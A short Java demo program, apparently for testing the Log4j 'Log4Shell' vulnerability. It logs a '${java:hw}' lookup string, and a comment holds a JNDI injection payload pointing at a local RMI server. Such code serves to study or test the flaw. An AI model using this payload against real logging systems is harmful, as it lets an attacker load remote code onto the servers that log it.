package com.example.admindemo.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;

public class Main {
    private static final Logger log = LogManager.getLogger(Main.class);

    public static void main(String[] args) throws IOException {
        String user = "${java:hw}"; //${jndi:rmi://127.0.0.1:1099/obj}
        log.info("user {}", user);
        while(true){}
    }
}
